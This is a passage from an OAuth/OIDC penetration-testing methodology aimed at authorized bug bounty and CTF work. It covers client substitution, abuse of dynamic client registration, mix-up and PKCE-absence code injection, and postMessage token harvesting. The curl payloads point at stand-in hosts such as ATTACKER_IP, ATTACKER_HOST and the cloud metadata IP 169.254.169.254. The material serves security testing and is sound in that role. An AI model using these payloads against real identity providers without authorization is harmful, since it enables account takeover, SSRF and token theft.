Phase 3.3 tests cross-client *code* redemption; Phase 4.3/6.3 test *token* audience. The substitution variant chains them and is worth calling out because it survives correct redirect matching and correct PKCE:

```text
Precondition: the IdP hosts two clients you can both drive — a low-privilege
public client (e.g. a marketing-site "newsletter" app, scope=openid email) and
a high-privilege one (the main app, scope=openid profile admin).

1. Run the flow against the LOW-priv client; obtain code_low (or token_low).
2. Attempt redemption / presentation against the HIGH-priv client:
   - code_low at /token with client_id=app_high (+ app_high's verifier/secret)
   - token_low (access or id) at app_high's session/consumption endpoint
3. Secure: invalid_grant (code bound to client_low) / 401 (aud != app_high).
   Finding: a 200 that yields an app_high session or an app_high-scoped token —
   privilege laundered from a client the attacker fully controls.
```

```bash
# Step 2, code path:
curl -s https://auth.example.com/token \
  -d grant_type=authorization_code -d "code=$CODE_LOW" \
  -d client_id=app_high -d "redirect_uri=$RU_HIGH" -d "client_secret=$HIGH_SECRET"
# Secure -> 400 {"error":"invalid_grant"}   Finding -> 200 {"access_token":"..."}
```

The resource-server twin: present `token_low` at app_high's API. If the RS validates only the signature and `exp` and never `aud`/`azp`/`client_id`, the low-privilege token acts as a high-privilege one. This is the server-side half of Phase 7's `aud`/`azp` row — test both the token endpoint *and* every resource server.

### S2.6 Dynamic client registration abuse (behind Phase 1.5)

Phase 1.5 registers a client to receive codes legitimately. Open/weak `registration_endpoint` (RFC 7591) is also an injection surface for *metadata the AS later renders or fetches*:

- **`logo_uri` / `client_uri` / `policy_uri` / `tos_uri`** are shown on the consent screen. Register `javascript:`/`data:` or an attacker image/link — stored content on the IdP's trusted consent origin (phishing, sometimes XSS).
- **`jwks_uri` / `sector_identifier_uri`** are *fetched by the AS* — SSRF against the AS's own network, and, if the AS later trusts keys from your `jwks_uri` for `private_key_jwt` client auth, a key-injection primitive.
- **`request_uris`** registered here feed the request-object-by-reference fetch (S2.3b).
- **`redirect_uris`** with your own host plus a victim-plausible `client_name` — the Phase 1.5 code-delivery path, no bypass needed.

```bash
curl -s https://auth.example.com/register -H 'Content-Type: application/json' -d '{
  "client_name":"Billing Export",
  "redirect_uris":["http://ATTACKER_IP/cb"],
  "logo_uri":"https://ATTACKER_HOST/x.svg",
  "jwks_uri":"http://169.254.169.254/latest/meta-data/",
  "token_endpoint_auth_method":"private_key_jwt"
}' | jq .
# Secure: registration rejected/authenticated, or metadata URIs allowlisted & never fetched server-side.
# Finding: 201 + a fetch lands on ATTACKER_HOST / the metadata IP = SSRF via registration.
```

### S2.7 Evilginx-class session theft — detection and report framing

Phishing-proxy kits (Evilginx and successors) sit between the victim and the real IdP, relay the full login, and **capture the issued session cookie / tokens after a genuine, MFA-completed authentication** — defeating TOTP and push MFA because the attacker replays the *session*, not the credential. This is attacker tradecraft, not a target vulnerability, so your job on a program is **detection and defensive framing**, never operating a kit against live users:

- **What makes a target harvestable:** session cookies without `__Host-`/`Secure`/`SameSite`; no token binding / DPoP (RFC 9449) / mTLS-bound tokens; long-lived sessions with no device or IP anomaly checks; no re-auth on sensitive actions. Each is a reportable hardening gap *on its own*, framed as "a reverse-proxy phishing kit would capture a replayable session because the token is bearer-only and unbound."
- **Phishing-resistant controls to recommend:** FIDO2/WebAuthn (origin-bound, defeats the proxy), token binding / DPoP sender-constraining, and short session lifetimes with continuous-access evaluation.
- **In an authorized red team** where social engineering is explicitly in scope, a proxy kit against *your own test identity* demonstrates feasibility — capture the relayed `Set-Cookie`/token exchange as evidence, and never phish real program users. The report's value is the missing binding control, with the capture as proof.

### S2.8 CTF notes — OAuth boxes are staples

OAuth/OIDC challenges recur in web CTFs (PortSwigger-style labs, CSAW, and HTB/THM "SSO" boxes). The patterns are the same classes above, but the economics differ — know what changes:

- **What is identical:** weak `redirect_uri` (a `startsWith`/prefix check is the single most common CTF OAuth bug), missing/unchecked `state`, `alg:none`/weak-HMAC on the ID token, and email-trust account linking. The `.well-known/openid-configuration` document is the intended map — read it first, exactly as Phase 0 says.
- **What differs from a bounty:** in a CTF the "attacker host" is usually a provided webhook/requestbin or a second container you fully control, so **code/token exfiltration to your endpoint is free and expected** — no authorized-program volume discipline, no evidence-minimization. The flag is the goal, so chains that would be "theoretical" in a report (self-registered client, lab IdP with forged claims, a deliberately planted open redirect) are the *intended* solution. CTF JWT secrets are usually crackable (`rockyou`) by design; real targets rarely are.
- **The giveaways:** an `admin`/`is_admin`/`role` claim in a decodable ID token, a `redirect_uri` the challenge *lets* you set, a second "internal" client in the discovery doc, or a callback that reflects `state`/`error_description` unescaped (reflected XSS → cookie theft). Solve order on a CTF box: read discovery → decode the token → test redirect/state → forge or steal → escalate the claim.

### S2.9 Post-exploitation evidence capture

For every confirmed class, capture proof that is complete but minimal — enough to reproduce, nothing more:

- **The delivered artifact off-origin:** the full `Location:`/request line showing `code=`/`access_token=` arriving at a host you control (Collaborator/requestbin log line, or proxy capture). Redact the code value's tail in the written report; keep the raw capture for triage.
- **The minted session:** one authenticated request that only *your* test victim account could make (e.g. `GET /me` returning the victim-test identity), screenshotted — not a dump of victim data.
- **The decision point:** both the *secure* baseline response and the *vulnerable* one, side by side (the S2.1 diff). A finding is the delta; show it.
- **Cleanup:** delete self-registered clients, un-link forced account links where the app allows, and note in the report what you created so the program can purge it. Record the exact timestamp of each probe — OAuth codes/tokens are short-lived and a triager re-running an expired code needs to know the window.

### S2.10 Mix-up attack — concrete two-IdP walkthrough (behind Phase 7's `iss` row)

Phase 7 states the `iss` binding as a table row; this is the full sequence, because mix-up is the one class an AI agent will skip for being "theoretical" — it is not, it is the reason RFC 9207 exists, and it reappears every time a client adds a second login provider with shared, provider-agnostic `state`/`nonce` storage. Precondition: the RP supports **two** IdPs (e.g. "Google" and "Honest-IdP") and the attacker can register/operate a client at the *attacker-controlled* or attacker-influenced IdP, or simply induce the victim to start the attacker's IdP flow.

```text
Setup: RP accepts login from IdP-A (honest, https://a.example.com) and
IdP-B (attacker-influenced, https://ATTACKER_HOST). RP stores the pending
flow state WITHOUT recording which IdP it was for.

1. Attacker starts a login at the RP selecting IdP-B; RP sets its cookie
   and hands back an /authorize URL for IdP-B. Attacker captures state=S.
2. Attacker induces the victim to begin a login that the victim believes
   is IdP-A, but the RP's pending record says "flow S" with no issuer bound.
3. Victim authenticates at IdP-A; IdP-A redirects code_A to the RP callback
   with state=S.
4. RP sees state=S, matches its pending record, and — because it did not
   bind the flow to an issuer — redeems code_A at IdP-B's token endpoint
   (the attacker's), handing the attacker a code valid at IdP-A.
   OR: the RP trusts the attacker's token_endpoint for a victim's code.
```

The defense, and therefore the test, is RFC 9207's `iss` authorization-response parameter: a compliant AS stamps `iss=https://a.example.com` on the callback, and a compliant RP rejects the response if `iss` does not equal the issuer it started the flow with.

```bash
# Does the RP bind the flow to an issuer? Complete IdP-A's flow but deliver
# the callback as if it were IdP-B's, and tamper/drop the iss parameter:
curl -si "https://app.example.com/auth/callback?code=$CODE_A&state=$S&iss=https://ATTACKER_HOST"
# Secure: 400 / flow rejected — issuer mismatch (RFC 9207) or no pending flow for that issuer.
# Finding: a session is minted, or the code is relayed to the wrong token endpoint.
```

Tells that mix-up is live before you run it: a single `state`/`nonce` cookie shared across both providers' buttons (not namespaced per issuer), a callback path shared by all IdPs with the provider chosen only by a `state`-embedded hint, and discovery/metadata where `authorization_response_iss_parameter_supported` is absent or `false`.

### S2.11 PKCE-absence code injection (the state/CSRF chain Phase 3 implies)

Phase 2 proves login-CSRF and Phase 3.2 flags the stripped-challenge row; this is the concrete chain that turns "PKCE absent" into a *targeted* account takeover rather than a generic CSRF. It is the attack PKCE was designed to kill, and it works whenever the code is not bound to a verifier **and** `state` is weak:

```text
Precondition: public client, no PKCE (or AS accepts a verifier for a code
that had no challenge — Phase 3.2 stripped row), and state is absent/weak.

1. Attacker runs the flow with their OWN credentials at IdP; stops at the
   callback and captures code_ATK (a valid code for the attacker's identity).
2. Attacker delivers to the victim's browser (authenticated session on the RP):
   <img src="https://app.example.com/auth/callback?code=code_ATK&state=<forged>">
3. Victim's RP redeems code_ATK, mints tokens for the ATTACKER's identity,
   and — the payload — binds/links that identity into the victim's active
   session, or logs the victim into the attacker's account so the victim's
   subsequent data lands in an account the attacker controls.
```

PKCE breaks step 3 because `code_ATK` was issued against the attacker's `code_challenge`; the victim's RP has no matching verifier and `/token` returns `invalid_grant`. So the test is a two-parter: confirm PKCE is absent/strippable (Phase 3.2) **and** confirm `state` does not stop cross-browser code delivery (Phase 2.2). Either alone is a weaker finding; together they are the injection chain — report them as one.

```bash
# Prove the injected (attacker-origin) code is accepted in a second context:
curl -s https://auth.example.com/token \
  -d grant_type=authorization_code -d "code=$CODE_ATK" \
  -d client_id=app_123 -d "redirect_uri=$RU"   # no code_verifier sent
# Secure -> 400 {"error":"invalid_grant"}   (PKCE/verifier binding holds)
# Finding -> 200 {"access_token":"..."}       (code accepted without a verifier)
```

### S2.12 postMessage / web_message origin exploitation (behind Phase 4.4)

Phase 4.4 names `response_mode=web_message` and "audit the listener's origin check"; this is the exploit mechanics, because silent-flow token harvesting via a sloppy `postMessage` listener is a zero-interaction takeover and the single most missed check in SPA OAuth. The IdP posts the response (`code`/`token`) to the opener window via `postMessage`; the opener's `message` handler is supposed to verify `event.origin` is the IdP before trusting `event.data`.

```javascript
// VULNERABLE — no origin check; any framing page can deliver forged data,
// and the real token posted here is readable by any script in this window
window.addEventListener("message", (e) => {
  handleToken(e.data.access_token);              // e.origin never checked
});

// SECURE — exact-origin allowlist before touching the payload
window.addEventListener("message", (e) => {
  if (e.origin !== "https://auth.example.com") return;
  handleToken(e.data.access_token);
});
```

Two attack directions, test both:

- **Harvest (silent flow):** open the IdP `/authorize` with `response_mode=web_message` + `prompt=none` in a hidden iframe from an attacker page. If the victim has a live IdP session, the IdP silently posts a fresh token — and if the listener (or the `targetOrigin` the IdP posts to) is `*` or a loose pattern, the attacker page receives it. The finding is confirmed when your attacker-origin page logs a real token with zero victim interaction.
- **Inject:** if the RP's listener omits the `event.origin` check, an attacker page that frames the RP can `postMessage` a forged response (an attacker-issued `code`/`token`, chaining with S2.11) straight into the handler.

```bash
# Fingerprint web_message support from discovery / a live /authorize:
curl -s https://auth.example.com/.well-known/openid-configuration \
  | jq '.response_modes_supported'          # look for "web_message"
# then drive one hidden-iframe prompt=none flow from a page on an origin you
# control and watch whether a token is delivered to it.
```

The RP-side and IdP-side checks are symmetric: the IdP must post to an exact registered `web_message` origin, and the RP must verify `event.origin`. A gap on either side is the finding; test with the mismatched origin you control.

### References (Supplement 2)

- Doyensec, "Common OAuth Vulnerabilities" (2025-01-30) — https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html
- RFC 7591 — OAuth 2.0 Dynamic Client Registration — https://www.rfc-editor.org/rfc/rfc7591
- RFC 9449 — OAuth 2.0 Demonstrating Proof of Possession (DPoP) — https://www.rfc-editor.org/rfc/rfc9449
- OpenID Connect Discovery 1.0 (`.well-known/openid-configuration`) — https://openid.net/specs/openid-connect-discovery-1_0.html
- GHSA-4pc9-x2fx-p7vj / CVE-2025-4143 (`@cloudflare/workers-oauth-provider` redirect_uri) — https://github.com/advisories/GHSA-4pc9-x2fx-p7vj
- CVE-2020-11053 / GHSA-j7px-6hwj-hpjg (oauth2-proxy HTML-encoded-whitespace redirect bypass) — https://github.com/oauth2-proxy/oauth2-proxy/security
- CVE-2020-5233 / GHSA-qqxw-m5fj-f7gv (oauth2-proxy malformed redirect pattern) — https://github.com/advisories/GHSA-qqxw-m5fj-f7gv
- CVE-2021-21291 / GHSA-4mf2-f3wh-gvf2 (oauth2-proxy suffix-match redirect) — https://github.com/advisories/GHSA-4mf2-f3wh-gvf2
- nOAuth (Descope, 2023-06; Semperis persistence analysis, 2025) — https://www.semperis.com/blog/noauth-abuse-alert-full-account-takeover/
- GHSA-g38m-r43w-p2q7 / CVE-2026-53516 (better-auth OAuth auto-link to unverified email) — https://github.com/advisories/GHSA-g38m-r43w-p2q7
- CVE-2026-35511 (Authorizer zero-click ATO via OAuth linking) — https://securelayer7.net/lab/cve-2026-35511-authorizer-oauth-account-takeover-unverified-email-linking
- CVE-2025-6514 / JFSA-2025-001290844 (mcp-remote discovery-metadata RCE) — https://research.jfrog.com/vulnerabilities/mcp-remote-command-injection-rce-jfsa-2025-001290844/
- Google Identity — do not use `email` to identify users, use `sub` — https://developers.google.com/identity/openid-connect/openid-connect

*Supplement 2 researched and written 2026-11-19 (claude-opus-4-8). CVE/advisory rows re-verified against primary advisories (GitHub Advisory Database, NVD, JFrog research, Semperis) at write time; taxonomy cross-checked against Doyensec's 2025 OAuth cheat sheet. Provider matching behaviors reflect vendor documentation current at that date — re-verify before reporting, as they drift. No CVE IDs, versions, or payloads were invented; where a fixed version was not published by the vendor (Authorizer, Trigger.dev), the row says "patched" rather than guessing a number.*
